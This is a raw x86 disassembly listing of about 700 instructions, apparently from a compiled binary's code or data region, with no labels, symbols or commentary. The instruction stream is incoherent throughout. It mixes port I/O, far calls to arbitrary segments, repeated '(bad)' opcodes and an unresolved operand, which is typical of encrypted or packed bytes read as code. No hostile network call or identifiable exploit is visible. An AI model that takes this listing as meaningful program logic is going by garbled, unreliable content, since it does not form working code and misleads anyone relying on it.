  40bf02:	add    dl,dl
  40bf04:	out    0xb9,eax
  40bf06:	adc    ah,BYTE PTR [esi-0x14952750]
  40bf0c:	add    eax,0x2d8ecff9
  40bf11:	sbb    al,0x59
  40bf13:	retf   0xcae0
  40bf16:	xchg   ebx,eax
  40bf17:	mov    ecx,0x2f8783c4
  40bf1c:	jmp    0x1d26:0xdc667b1
  40bf23:	data16 out dx,al
  40bf25:	push   0xffffffae
  40bf27:	dec    ebx
  40bf28:	push   ss
  40bf29:	pop    ecx
  40bf2a:	sub    cl,ch
  40bf2c:	cmp    DWORD PTR [eax-0x786d823a],edi
  40bf32:	call   0x274f:0xc004f27f
  40bf39:	inc    ebp
  40bf3a:	xor    al,0x88
  40bf3c:	repz out 0x20,al
  40bf3f:	and    dh,ah
  40bf41:	loop   0x40bf8d
  40bf43:	xchg   ecx,eax
  40bf44:	jle    0x40bed1
  40bf46:	addr16 xor bh,ah
  40bf49:	call   0xe6eba62e
  40bf4e:	inc    ebp
  40bf4f:	jno    0x40bf0a
  40bf51:	jg     0x40bee0
  40bf53:	ins    BYTE PTR es:[edi],dx
  40bf54:	and    ch,al
  40bf56:	sub    edi,edi
  40bf58:	jp     0x40bf83
  40bf5a:	pop    ss
  40bf5b:	out    0x59,eax
  40bf5d:	push   0x30
  40bf5f:	test   al,0x3f
  40bf61:	and    eax,DWORD PTR ds:0x81c98fef
  40bf67:	test   ebp,ebx
  40bf69:	das    
  40bf6a:	push   eax
  40bf6b:	call   0x10ab:0x98e973e3
  40bf72:	pop    ecx
  40bf73:	adc    eax,0xa008f00e
  40bf78:	or     eax,0x51fabf48
  40bf7d:	loope  0x40bfed
  40bf7f:	mov    ebx,0xec1b4918
  40bf84:	bound  ecx,QWORD PTR [ecx+0x72]
  40bf87:	adc    dh,BYTE PTR [ecx+edx*4]
  40bf8a:	test   al,0xb8
  40bf8c:	call   0xd5eb:0x87f6e7e8
  40bf93:	adc    esi,0x39
  40bf96:	ret    
  40bf97:	clc    
  40bf98:	in     al,0x4c
  40bf9a:	and    al,0x26
  40bf9c:	adc    BYTE PTR [edx-0x6a22a7de],al
  40bfa2:	mov    bl,0xcb
  40bfa4:	in     eax,0xfe
  40bfa6:	gs push es
  40bfa8:	int3   
  40bfa9:	adc    eax,0xf4fe4938
  40bfae:	not    DWORD PTR [esi-0x5d]
  40bfb1:	xor    al,0x95
  40bfb3:	push   edi
  40bfb4:	retf   
  40bfb5:	xchg   ebx,eax
  40bfb6:	sub    BYTE PTR [ecx+0x7b451e57],dl
  40bfbc:	outs   dx,DWORD PTR ds:[esi]
  40bfbd:	xchg   ecx,eax
  40bfbe:	mov    ebx,0x755c651e
  40bfc3:	inc    edi
  40bfc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc5:	stos   DWORD PTR es:[edi],eax
  40bfc6:	(bad)  
  40bfc7:	out    0x8d,al
  40bfc9:	test   eax,0x66ab5c4f
  40bfce:	call   FWORD PTR [edi-0x2a]
  40bfd1:	adc    esp,DWORD PTR [esi+0x5bb2ffb3]
  40bfd7:	xchg   ebp,eax
  40bfd8:	jg     0x40bfb8
  40bfda:	jg     0x40bfef
  40bfdc:	outs   dx,BYTE PTR ds:[esi]
  40bfdd:	out    dx,al
  40bfde:	outs   dx,BYTE PTR ds:[esi]
  40bfdf:	je     0x40bfa7
  40bfe1:	jp     0x40bfe7
  40bfe3:	icebp  
  40bfe4:	pop    esi
  40bfe5:	mov    al,0x2b
  40bfe7:	mov    BYTE PTR [ecx],dl
  40bfe9:	mov    bh,0x34
  40bfeb:	mov    ah,0x6c
  40bfed:	dec    ebp
  40bfee:	or     eax,0x1fe91ad9
  40bff3:	cli    
  40bff4:	jo     0x40c00d
  40bff6:	jne    0x40c042
  40bff8:	xor    cl,BYTE PTR [edx+0x6e0e7109]
  40bffe:	lock xchg ebx,eax
  40c000:	xchg   esp,eax
  40c001:	les    eax,FWORD PTR [eax+esi*8]
  40c004:	xchg   ecx,eax
  40c005:	cmp    al,0x5f
  40c007:	aaa    
  40c008:	pop    ds
  40c009:	push   esp
  40c00a:	stos   DWORD PTR es:[edi],eax
  40c00b:	loop   0x40bfe6
  40c00d:	adc    eax,0x961b2842
  40c012:	mov    dl,0xf1
  40c014:	sbb    BYTE PTR [ecx+0x1cdf501e],ah
  40c01a:	out    0x97,al
  40c01c:	xchg   BYTE PTR [esi+0xd876e1a],al
  40c022:	jo     0x40c024
  40c024:	inc    eax
  40c025:	or     edi,DWORD PTR [ebp+0x7b]
  40c028:	loopne 0x40c024
  40c02a:	inc    eax
  40c02b:	sbb    BYTE PTR [esi+0x29],dh
  40c02e:	ror    BYTE PTR [ebp-0xf],0xf7
  40c032:	inc    ecx
  40c033:	jae    0x40c091
  40c035:	fst    QWORD PTR [edi]
  40c037:	dec    edx
  40c038:	xor    eax,DWORD PTR [esi+edi*1]
  40c03b:	or     dl,BYTE PTR [ebp-0x34]
  40c03e:	repz mov ds:0x92b63856,al
  40c044:	or     ebx,DWORD PTR [esi+0x4e83b8b5]
  40c04a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c04b:	std    
  40c04c:	dec    ebx
  40c04d:	mov    ebp,0x311a50a7
  40c052:	ins    BYTE PTR es:[edi],dx
  40c053:	inc    esp
  40c054:	mov    ebx,eax
  40c056:	xchg   edx,eax
  40c057:	push   es
  40c058:	sub    DWORD PTR [ebx+eax*1+0x2b],0x15585552
  40c060:	lds    edx,FWORD PTR [edi*4+0x50b34fa2]
  40c067:	push   esp
  40c068:	adc    DWORD PTR [edi-0x7f4b6385],eax
  40c06e:	adc    DWORD PTR ds:0xb77482c0,edi
  40c074:	(bad)  
  40c075:	pusha  
  40c076:	push   ss
  40c077:	test   eax,0x7f5e05
  40c07c:	xchg   bl,al
  40c07e:	je     0x40c02c
  40c080:	fimul  DWORD PTR [ebx+0x28a82a61]
  40c086:	jns    0x40c076
  40c088:	mov    ebp,0x35cad31c
  40c08d:	jne    0x40c0c3
  40c08f:	jae    0x40c10d
  40c091:	fstp   QWORD PTR [ebx]
  40c093:	cmp    cl,ah
  40c095:	clc    
  40c096:	adc    edi,ebp
  40c098:	fld    QWORD PTR [edi]
  40c09a:	popa   
  40c09b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c09c:	in     al,0x1f
  40c09e:	push   ebx
  40c09f:	dec    edi
  40c0a0:	bound  esi,QWORD PTR [edi]
  40c0a2:	inc    ebx
  40c0a3:	retf   0xbd6b
  40c0a6:	mov    ah,0xd8
  40c0a8:	xchg   BYTE PTR [ebp+0x55],ah
  40c0ab:	sbb    edx,DWORD PTR [edx-0x4331a8f0]
  40c0b1:	ins    BYTE PTR es:[edi],dx
  40c0b2:	rcr    bh,1
  40c0b4:	mov    ebp,0x6133a338
  40c0b9:	hlt    
  40c0ba:	jae    0x40c138
  40c0bc:	pop    es
  40c0bd:	mov    eax,0x1cffac75
  40c0c2:	cdq    
  40c0c3:	mov    cl,0xa4
  40c0c5:	je     0x40c063
  40c0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c8:	xchg   BYTE PTR [ebp+0x3d969d53],dh
  40c0ce:	retf   0x312a
  40c0d1:	in     eax,dx
  40c0d2:	in     al,0xa9
  40c0d4:	jmp    0x40c0a9
  40c0d6:	adc    esi,DWORD PTR [esi-0x2c]
  40c0d9:	push   ds
  40c0da:	adc    al,BYTE PTR ds:0xde34e307
  40c0e0:	inc    ecx
  40c0e1:	rcl    DWORD PTR [edi+0x34],1
  40c0e4:	test   eax,0xba2f5a21
  40c0e9:	mov    ebx,0x407a7430
  40c0ee:	out    dx,al
  40c0ef:	mov    dl,0x18
  40c0f1:	faddp  st(5),st
  40c0f3:	inc    ecx
  40c0f4:	cmp    ah,BYTE PTR [ebx-0x330625de]
  40c0fa:	cli    
  40c0fb:	push   edi
  40c0fc:	mov    DWORD PTR [ebx+ebp*2-0x5c],esi
  40c100:	add    edi,ebp
  40c102:	retf   
  40c103:	retf   
  40c104:	outs   dx,DWORD PTR ds:[esi]
  40c105:	call   DWORD PTR [edi+0x10]
  40c108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c109:	and    DWORD PTR [edx+ecx*8-0x5e],ecx
  40c10d:	xor    ebp,eax
  40c10f:	cld    
  40c110:	repz jne 0x40c14a
  40c113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c114:	ins    DWORD PTR es:[edi],dx
  40c115:	and    eax,edi
  40c117:	mov    eax,ds:0xb4b423ec
  40c11c:	jp     0x40c175
  40c11e:	popf   
  40c11f:	retf   
  40c120:	js     0x40c0a2
  40c122:	pop    esi
  40c123:	call   0xa8eabb01
  40c128:	pop    es
  40c129:	das    
  40c12a:	adc    eax,0xbe98650
  40c12f:	sub    DWORD PTR [eax+edi*8+0x2c],edi
  40c133:	rcr    BYTE PTR [ecx+0x6f539665],0x7b
  40c13a:	lods   eax,DWORD PTR ds:[esi]
  40c13b:	mov    dh,BYTE PTR [esi-0x627442ce]
  40c141:	addr16 (bad) 
  40c143:	hlt    
  40c144:	push   eax
  40c145:	or     esi,ecx
  40c147:	ins    DWORD PTR es:[edi],dx
  40c148:	shr    DWORD PTR [ecx-0x62],1
  40c14b:	mov    BYTE PTR [ebx+0x7093a632],al
  40c151:	adc    eax,0x78ef04b9
  40c156:	lods   eax,DWORD PTR ds:[esi]
  40c157:	inc    edx
  40c158:	adc    eax,0x910492e3
  40c15d:	test   al,0x9a
  40c15f:	mov    dl,0xd7
  40c161:	mov    dl,BYTE PTR [edi+0x3e]
  40c164:	or     bl,ah
  40c166:	dec    BYTE PTR [ebp-0x427d1478]
  40c16c:	iret   
  40c16d:	mov    ebx,0x34c82132
  40c172:	sub    BYTE PTR [eax-0x235d6c6e],dh
  40c178:	sbb    dl,BYTE PTR [esi+0x10b1974e]
  40c17e:	or     DWORD PTR [ecx-0x138aa6e4],ecx
  40c184:	in     eax,dx
  40c185:	fdiv   st,st(0)
  40c187:	xchg   edx,eax
  40c188:	jecxz  0x40c162
  40c18a:	dec    esi
  40c18b:	nop
  40c18c:	push   edx
  40c18d:	inc    ebx
  40c18e:	jp     0x40c186
  40c190:	data16 add al,0x18
  40c193:	rol    BYTE PTR [esi],0x61
  40c196:	mov    al,0xb0
  40c198:	js     0x40c1ad
  40c19a:	call   0xad9011dd
  40c19f:	pop    eax
  40c1a0:	fwait
  40c1a1:	mov    bh,0x63
  40c1a3:	inc    esi
  40c1a4:	dec    eax
  40c1a5:	sub    bh,BYTE PTR [eax-0xe]
  40c1a8:	adc    DWORD PTR [ecx],edx
  40c1aa:	sub    al,0xad
  40c1ac:	cmp    al,0xc3
  40c1ae:	cmc    
  40c1af:	out    0x50,eax
  40c1b1:	mov    DWORD PTR [esi-0x75e69dcf],0xf204440b
  40c1bb:	pop    es
  40c1bc:	je     0x40c187
  40c1be:	jmp    0x40c22f
  40c1c0:	rcr    BYTE PTR [eax],cl
  40c1c2:	sub    dh,BYTE PTR ds:0xcae1173b
  40c1c8:	in     eax,0x77
  40c1ca:	sbb    al,0x6c
  40c1cc:	repnz imul eax,edx,0xabbecd47
  40c1d3:	iret   
  40c1d4:	ja     0x40c1d7
  40c1d6:	xlat   BYTE PTR es:[ebx]
  40c1d8:	pop    edx
  40c1d9:	xchg   ebp,eax
  40c1da:	ja     0x40c1c9
  40c1dc:	cmp    eax,0xa06d6315
  40c1e1:	sbb    DWORD PTR [esi-0x958b807],esi
  40c1e7:	fcomp  QWORD PTR [edi+ecx*1+0x6f]
  40c1eb:	inc    ebp
  40c1ec:	mov    al,0x74
  40c1ee:	adc    BYTE PTR [esi-0x53dec666],ch
  40c1f4:	repnz mov ch,bl
  40c1f7:	dec    eax
  40c1f8:	sbb    dl,dl
  40c1fa:	push   ebx
  40c1fb:	pop    esp
  40c1fc:	jmp    0x67cac2f6
  40c201:	mov    cl,0xf2
  40c203:	sbb    ecx,DWORD PTR [esi-0x292241d1]
  40c209:	sti    
  40c20a:	or     eax,0x176aa15e
  40c20f:	sbb    al,0xd3
  40c211:	or     cl,BYTE PTR [ebp-0x6ea2dd4c]
  40c217:	mov    ecx,0x37c6f0ac
  40c21c:	stos   DWORD PTR es:[edi],eax
  40c21d:	std    
  40c21e:	add    BYTE PTR [ecx+0xecc5bcb],dl
  40c224:	adc    eax,0x8f70e5ce
  40c229:	je     0x40c226
  40c22b:	jecxz  0x40c236
  40c22d:	je     0x40c224
  40c22f:	fdivr  QWORD PTR [ecx]
  40c231:	cmp    eax,0xd02fc04c
  40c236:	mov    edi,0x10ceb663
  40c23b:	cmp    eax,0xfb77f9c2
  40c240:	out    dx,al
  40c241:	into   
  40c242:	sub    edx,DWORD PTR [ebp-0x74]
  40c245:	fs stos DWORD PTR es:[edi],eax
  40c247:	ret    0xebc1
  40c24a:	dec    ebx
  40c24b:	jb     0x40c20c
  40c24d:	out    0x27,al
  40c24f:	and    ah,BYTE PTR [eax]
  40c251:	and    cl,BYTE PTR [ecx-0x4a]
  40c254:	arpl   WORD PTR [ebx+0x44],si
  40c257:	inc    ebp
  40c258:	dec    edi
  40c259:	jl     0x40c287
  40c25b:	adc    edi,DWORD PTR [esi]
  40c25d:	push   0xffffffab
  40c25f:	jge    0x40c242
  40c261:	repz inc ecx
  40c263:	int3   
  40c264:	(bad)  
  40c265:	xor    BYTE PTR [edi+0x4a],dl
  40c268:	fisubr WORD PTR [ebx]
  40c26a:	dec    esp
  40c26b:	and    al,0x30
  40c26d:	add    dh,BYTE PTR [ebp+0xd]
  40c270:	mov    ds:0x3b974d67,eax
  40c275:	push   esi
  40c276:	inc    eax
  40c277:	adc    bl,0x3b
  40c27a:	jo     0x40c232
  40c27c:	xchg   ecx,eax
  40c27d:	pop    edi
  40c27e:	mov    ecx,0x6df0c491
  40c283:	push   0x36
  40c285:	push   ebp
  40c286:	mov    ds:0xd2731990,al
  40c28b:	std    
  40c28c:	cmp    DWORD PTR [esi-0x45],esp
  40c28f:	jnp    0x40c2f1
  40c291:	enter  0xd67b,0xe3
  40c295:	into   
  40c296:	pop    eax
  40c297:	jge    0x40c23a
  40c299:	sbb    BYTE PTR [ebx+eax*4],ah
  40c29c:	cmp    BYTE PTR [edx],cl
  40c29e:	pop    esp
  40c29f:	and    eax,0x9fc7e731
  40c2a4:	sbb    BYTE PTR [esi+esi*8],bh
  40c2a7:	stos   BYTE PTR es:[edi],al
  40c2a8:	aad    0x24
  40c2aa:	pop    ss
  40c2ab:	fistp  DWORD PTR fs:[eax]
  40c2ae:	mov    al,ds:0x317ad039
  40c2b3:	daa    
  40c2b4:	xor    bh,BYTE PTR [ecx+0x70]
  40c2b7:	sbb    BYTE PTR [edi],cl
  40c2b9:	cmp    eax,DWORD PTR [edi+0x7]
  40c2bc:	das    
  40c2bd:	pop    esp
  40c2be:	aaa    
  40c2bf:	pop    ebp
  40c2c0:	rcl    DWORD PTR [edx+0x1a],1
  40c2c3:	repnz sbb esi,edx
  40c2c6:	js     0x40c258
  40c2c8:	push   edx
  40c2c9:	mov    ebx,0x6f098cf5
  40c2ce:	inc    edi
  40c2cf:	dec    esp
  40c2d0:	stos   BYTE PTR es:[edi],al
  40c2d1:	call   0x8c74176b
  40c2d6:	retf   0x1bff
  40c2d9:	xchg   ecx,eax
  40c2da:	inc    BYTE PTR [esi]
  40c2dc:	mov    fs,WORD PTR [ecx-0x64c2580a]
  40c2e2:	cmp    al,dh
  40c2e4:	leave  
  40c2e5:	fwait
  40c2e6:	inc    esi
  40c2e7:	stos   DWORD PTR es:[edi],eax
  40c2e8:	push   cs
  40c2e9:	(bad)  
  40c2eb:	imul   ebp,DWORD PTR [edi+ebx*8+0x66443905],0x47ac446c
  40c2f6:	and    al,0x0
  40c2f8:	mov    dh,0xed
  40c2fa:	jecxz  0x40c2e7
  40c2fc:	and    edx,esi
  40c2fe:	imul   DWORD PTR [edi]
  40c300:	push   esp
  40c301:	das    
  40c302:	pop    ebp
  40c303:	dec    edi
  40c304:	dec    esi
  40c305:	dec    ebx
  40c306:	xchg   BYTE PTR [ebx+edx*8],ah
  40c309:	stos   BYTE PTR es:[edi],al
  40c30a:	nop
  40c30b:	add    ebp,DWORD PTR [ebp+edi*4+0x693588b]
  40c312:	lods   al,BYTE PTR ds:[esi]
  40c313:	ret    
  40c314:	fidiv  WORD PTR [ecx+0x7c6a768a]
  40c31a:	sub    eax,DWORD PTR [esp+edx*4+0x4e]
  40c31e:	sub    al,BYTE PTR [edx-0x18]
  40c321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c322:	enter  0xb29d,0x4b
  40c326:	pusha  
  40c327:	jnp    0x40c2f1
  40c329:	push   eax
  40c32a:	or     BYTE PTR ds:0x9c90d87d,bh
  40c330:	pop    edi
  40c331:	ret    
  40c332:	imul   ebp,DWORD PTR [ecx+0x1a2c8dc6],0x57
  40c339:	xchg   ecx,eax
  40c33a:	cmp    eax,0xd411d61a
  40c33f:	out    dx,al
  40c340:	out    dx,eax
  40c341:	adc    BYTE PTR [esi+0x1e],ah
  40c344:	imul   edi,DWORD PTR [edx-0x3a],0x7983e669
  40c34b:	dec    edi
  40c34c:	retf   0x61ec
  40c34f:	(bad)  
  40c350:	loope  0x40c37a
  40c352:	ret    
  40c353:	adc    eax,0x14aa5db6
  40c358:	cmp    al,0x49
  40c35a:	and    ecx,DWORD PTR [ebx]
  40c35c:	jnp    0x40c39a
  40c35e:	test   BYTE PTR [ebx],dh
  40c360:	pop    ss
  40c361:	jo     0x40c311
  40c363:	push   esi
  40c364:	jno    0x40c303
  40c366:	mov    ecx,0x378f7fa9
  40c36b:	and    edx,DWORD PTR [edi-0x25]
  40c36e:	xchg   ecx,eax
  40c36f:	xchg   esp,eax
  40c370:	sub    al,0x80
  40c372:	ins    DWORD PTR es:[edi],dx
  40c373:	fnstsw WORD PTR [edi+ebx*2]
  40c376:	cwde   
  40c377:	adc    DWORD PTR [edx-0x67],0x20
  40c37b:	xor    bh,bl
  40c37d:	xor    edi,esi
  40c37f:	fstp   TBYTE PTR [ebp+0x6e94ab3b]
  40c385:	add    al,0x37
  40c387:	dec    edi
  40c388:	inc    ebp
  40c389:	add    edi,edx
  40c38b:	loop   0x40c312
  40c38d:	pop    es
  40c38e:	dec    edi
  40c38f:	sbb    al,0xb9
  40c391:	add    ebx,DWORD PTR [eax+0xa68e7c7]
  40c397:	loop   0x40c3c0
  40c399:	(bad)
  40c39c:	in     al,dx
  40c39d:	sbb    eax,0xc6f06c83
  40c3a2:	and    al,cl
  40c3a4:	pop    esi
  40c3a5:	test   DWORD PTR [edi-0xcf33039],edx
  40c3ab:	fdivr  QWORD PTR [esp+ecx*8]
  40c3ae:	test   DWORD PTR [eax+ecx*8],edx
  40c3b1:	and    esi,DWORD PTR [ecx]
  40c3b3:	ja     0x40c366
  40c3b5:	dec    edx
  40c3b6:	jnp    0x40c434
  40c3b8:	int    0x8f
  40c3ba:	dec    edx
  40c3bb:	scas   eax,DWORD PTR es:[edi]
  40c3bc:	je     0x40c400
  40c3be:	xor    ebx,ebx
  40c3c0:	mov    BYTE PTR [edi+0x6b2d75a6],cl
  40c3c6:	je     0x40c3d0
  40c3c8:	cmp    BYTE PTR [esi],ch
  40c3ca:	push   edi
  40c3cb:	dec    edx
  40c3cc:	or     DWORD PTR [ecx+0x1e],0x5
  40c3d0:	addr16 jl 0x40c3fd
  40c3d3:	stos   BYTE PTR es:[edi],al
  40c3d4:	push   es
  40c3d5:	ins    DWORD PTR es:[edi],dx
  40c3d6:	test   DWORD PTR [esi+ebx*4+0x751ee365],0x7312255c
  40c3e1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e3:	mov    DWORD PTR [ecx],ebx
  40c3e5:	retf   
  40c3e6:	cld    
  40c3e7:	mov    ?,ebx
  40c3e9:	adc    al,0xe0
  40c3eb:	js     0x40c3ba
  40c3ed:	dec    esp
  40c3ee:	inc    edi
  40c3ef:	xchg   ah,dl
  40c3f1:	cdq    
  40c3f2:	mov    edx,0xaa4904e8
  40c3f7:	neg    DWORD PTR [edi+edx*8+0x52e038af]
  40c3fe:	inc    edx
  40c3ff:	jbe    0x40c3ad
  40c401:	mov    fs,ebx
  40c403:	test   eax,0xe429ab8e
  40c408:	nop
  40c409:	mov    eax,0x1ae3829
  40c40e:	call   0x6dcd:0xcbf48fd4
  40c415:	mov    edi,0xbee71163
  40c41a:	push   cs
  40c41b:	pop    edx
  40c41c:	xor    eax,DWORD PTR [eax-0x43]
  40c41f:	test   al,0x1b
  40c421:	sub    eax,0x3d657054
  40c426:	and    edx,DWORD PTR [ecx-0x6d4be187]
  40c42c:	mov    ebx,0x1b3c6f26
  40c431:	sahf   
  40c432:	js     0x40c3d9
  40c434:	mov    dh,0xb1
  40c436:	push   ss
  40c437:	out    dx,al
  40c438:	and    al,0xb9
  40c43a:	add    ebx,DWORD PTR [edx]
  40c43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c43d:	hlt    
  40c43e:	xchg   esi,eax
  40c43f:	fstp   DWORD PTR ss:[eax+0x691302f]
  40c446:	popa   
  40c447:	sti    
  40c448:	or     edi,DWORD PTR [esi-0x3d16232]
  40c44e:	aam    0x95
  40c450:	ret    
  40c451:	out    0x6b,al
  40c453:	pusha  
  40c454:	retf   0x8282
  40c457:	push   es
  40c458:	shl    DWORD PTR [esi+edx*1-0x25dce256],1
  40c45f:	shr    BYTE PTR [ecx],cl
  40c461:	jne    0x40c3f6
  40c463:	adc    al,BYTE PTR [edx+0x50ab53f3]
  40c469:	les    edx,FWORD PTR [ecx+0x3f]
  40c46c:	sub    edx,DWORD PTR [edi]
  40c46e:	js     0x40c493
  40c470:	call   0x90c6d8bc
  40c475:	lahf   
  40c476:	sub    DWORD PTR [ebx],0xf2ce0d66
  40c47c:	sbb    BYTE PTR [eax],ah
  40c47e:	dec    edi
  40c47f:	inc    edx
  40c480:	enter  0xd2a1,0xa5
  40c484:	cmp    al,0x58
  40c486:	mov    edx,0x411cfeb0
  40c48b:	cmp    al,0x54
  40c48d:	cdq    
  40c48e:	out    dx,al
  40c48f:	dec    ecx
  40c490:	xchg   DWORD PTR [edx+0x3a],ebp
  40c493:	sbb    DWORD PTR [edx-0xb],0xffffffc6
  40c497:	retf   0xc251
  40c49a:	xor    eax,0xc27f79f5
  40c49f:	adc    BYTE PTR [ebx+0x5dc54883],0x24
  40c4a6:	call   0x9c23d6d
  40c4ab:	repz (bad) 
  40c4ad:	pusha  
  40c4ae:	mov    edx,0x7c083327
  40c4b3:	(bad)  
  40c4b4:	and    BYTE PTR [edi+0x51],bh
  40c4b7:	jb     0x40c45c
  40c4b9:	inc    edi
  40c4ba:	ss jb  0x40c43d
  40c4bd:	mov    al,ds:0xa4a5b6a2
  40c4c2:	xor    DWORD PTR [ecx+esi*4],esi
  40c4c5:	push   0x34
  40c4c7:	(bad)  
  40c4c8:	mov    eax,0xc2cf86c8
  40c4cd:	fild   QWORD PTR [eax-0x4b]
  40c4d0:	mov    ds:0xa2f9da0b,eax
  40c4d5:	ja     0x40c48b
  40c4d7:	sbb    ecx,DWORD PTR [ecx-0x17]
  40c4da:	pmaxub mm5,QWORD PTR [ecx+0x1640f4de]
  40c4e1:	lods   al,BYTE PTR ds:[esi]
  40c4e2:	dec    ecx
  40c4e3:	(bad)  
  40c4e4:	ror    DWORD PTR [esi],cl
  40c4e6:	jge    0x40c4c2
  40c4e8:	fwait
  40c4e9:	cmc    
  40c4ea:	jae    0x40c50f
  40c4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ed:	(bad)
  40c4f1:	add    ebx,DWORD PTR [edi]
  40c4f3:	in     al,0x53
  40c4f5:	outs   dx,DWORD PTR ds:[esi]
  40c4f6:	or     BYTE PTR [ebx+0x25e1c416],0xa
  40c4fd:	fwait
  40c4fe:	mov    ecx,0xef9d579
  40c503:	cmp    DWORD PTR [eax-0x3a],esi
  40c506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c507:	dec    esi
  40c508:	pop    edi
  40c509:	or     dh,BYTE PTR ds:0x790702ac
  40c50f:	sbb    BYTE PTR [edx],0x92
  40c512:	int    0x8a
  40c514:	cld    
  40c515:	icebp  
  40c516:	aad    0xfb
  40c518:	ret    0x9506
  40c51b:	pop    esp
  40c51c:	cmp    esp,DWORD PTR [eax-0x5cbb2463]
  40c522:	imul   edx,DWORD PTR ds:0x1efddfc6,0xfffffff0
  40c529:	pusha  
  40c52a:	mov    dl,0x7
  40c52c:	pushf  
  40c52d:	dec    esp
  40c52e:	mov    eax,ds:0x76cdc5db
  40c533:	ds push ebp
  40c535:	int    0xcb
  40c537:	retf   0xfd8a
  40c53a:	gs inc edx
  40c53c:	lods   al,BYTE PTR ds:[esi]
  40c53d:	out    dx,al
  40c53e:	mov    al,0x70
  40c540:	not    DWORD PTR ds:0xb44d19da
  40c546:	mov    al,ds:0xcb2dab72
  40c54b:	adc    BYTE PTR [eax+eiz*2-0x65],bh
  40c54f:	jno    0x40c500
  40c551:	loopne 0x40c589
  40c553:	push   ss
  40c554:	xlat   BYTE PTR ds:[ebx]
  40c555:	or     al,0xee
  40c557:	in     al,0x75
  40c559:	fimul  DWORD PTR [ebx-0x7e]
  40c55c:	mov    ah,0xf1
  40c55e:	xor    ecx,DWORD PTR [edi-0x24]
  40c561:	out    dx,al
  40c562:	imul   esi,DWORD PTR [ecx+0x4be9b0d0],0x36f56f5c
  40c56c:	mov    esp,0x137879da
  40c571:	(bad)  
  40c573:	in     al,dx
  40c574:	or     al,0xec
  40c576:	enter  0x282a,0x27
  40c57a:	iret   
  40c57b:	rol    DWORD PTR [ebx],1
  40c57d:	pushf  
  40c57e:	jmp    0xdbb90191
  40c583:	mov    ebx,0xeb51dfaf
  40c588:	js     0x40c52e
  40c58a:	push   ss
  40c58b:	pop    edi
  40c58c:	pop    esi
  40c58d:	outs   dx,DWORD PTR ds:[esi]
  40c58e:	jp     0x40c53c
  40c590:	popa   
  40c591:	lods   al,BYTE PTR ds:[esi]
  40c592:	cmp    BYTE PTR [edx],bl
  40c594:	mov    ebx,0x12b6e5df
  40c599:	lods   al,BYTE PTR ds:[esi]
  40c59a:	mov    esp,0x43aa9cc3
  40c59f:	daa    
  40c5a0:	pop    eax
  40c5a1:	jmp    0x9f31c06d
  40c5a6:	push   eax
  40c5a7:	cmc    
  40c5a8:	dec    esp
  40c5a9:	cdq    
  40c5aa:	push   cs
  40c5ab:	stos   DWORD PTR es:[edi],eax
  40c5ac:	jbe    0x40c5c2
  40c5ae:	xor    bh,ah
  40c5b0:	int    0xa
  40c5b2:	jge    0x40c62c
  40c5b4:	fs (bad) 
  40c5b6:	mov    ds:0xa1ecac18,al
  40c5bb:	xchg   DWORD PTR [ecx+0x4c],ecx
  40c5be:	push   ecx
  40c5bf:	loopne 0x40c5a8
  40c5c1:	loope  0x40c60b
  40c5c3:	retf   0x4d89
  40c5c6:	dec    ebp
  40c5c7:	inc    esi
  40c5c8:	dec    edi
  40c5c9:	xor    DWORD PTR [ecx],edi
  40c5cb:	cmp    ecx,DWORD PTR gs:[esi-0x20a1d576]
  40c5d2:	jb     0x40c602
  40c5d4:	add    bl,ah
  40c5d6:	sahf   
  40c5d7:	push   es
  40c5d8:	leave  
  40c5d9:	pop    ss
  40c5da:	fs pop ebx
  40c5dc:	mov    esp,DWORD PTR [esi+0x65e16f52]
  40c5e2:	and    ah,BYTE PTR [ebx+0x1d]
  40c5e5:	outs   dx,DWORD PTR ds:[esi]
  40c5e6:	rcl    BYTE PTR [ebx-0x2552f5c9],1
  40c5ec:	out    0xaa,eax
  40c5ee:	test   DWORD PTR [eax-0x62],ebp
  40c5f1:	stos   BYTE PTR es:[edi],al
  40c5f2:	sti    
  40c5f3:	cmp    edi,ecx
  40c5f5:	scas   al,BYTE PTR es:[edi]
  40c5f6:	arpl   WORD PTR [esi-0x7550606],dx
  40c5fc:	mov    cl,0x51
  40c5fe:	mov    bh,0xaa
  40c600:	dec    esp
  40c601:	sub    eax,0xb517e01f
  40c606:	xchg   dh,bl
  40c608:	out    dx,al
  40c609:	xor    DWORD PTR [eax-0x4f],esp
  40c60c:	sbb    DWORD PTR [edx+esi*1-0x3c1ccdcf],esp
  40c613:	sbb    eax,0x7e6b966b
  40c618:	btr    DWORD PTR [ecx+eax*4+0x62],0x38
  40c61e:	shl    BYTE PTR [ebp-0x454fb2e1],1
  40c624:	out    dx,al
  40c625:	push   esp
  40c626:	adc    ecx,DWORD PTR [edi+0x1b]
  40c629:	adc    bh,0x96
  40c62c:	clc    
  40c62d:	add    ebp,DWORD PTR [eax-0x1e]
  40c630:	jo     0x40c686
  40c632:	push   edx
  40c633:	cmp    ebp,DWORD PTR [edx]
  40c635:	cmp    BYTE PTR [esi+0x1f660bf9],0x77
  40c63c:	dec    esi
  40c63d:	gs mov dl,0x42
  40c640:	push   ecx
  40c641:	mov    dh,0xad
  40c643:	dec    ecx
  40c644:	lock xchg DWORD PTR [eax-0x3d],edi
  40c648:	aad    0x2e
  40c64a:	mov    dh,0x79
  40c64c:	push   ds
  40c64d:	shl    DWORD PTR [edx+0x1f],0xac
  40c651:	enter  0x9a87,0x5d
  40c655:	sti    
  40c656:	cdq    
  40c657:	jnp    0x40c6bf
  40c659:	shr    DWORD PTR [ebp-0x5a17039c],0x96
  40c660:	dec    esp
  40c661:	xlat   BYTE PTR ds:[ebx]
  40c662:	call   eax
  40c664:	lods   al,BYTE PTR ds:[esi]
  40c665:	sbb    DWORD PTR [esi+0x5d],0xa45f4ebc
  40c66c:	or     ch,ah
  40c66e:	fist   WORD PTR [ebx+edx*8+0x48]
  40c672:	cmc    
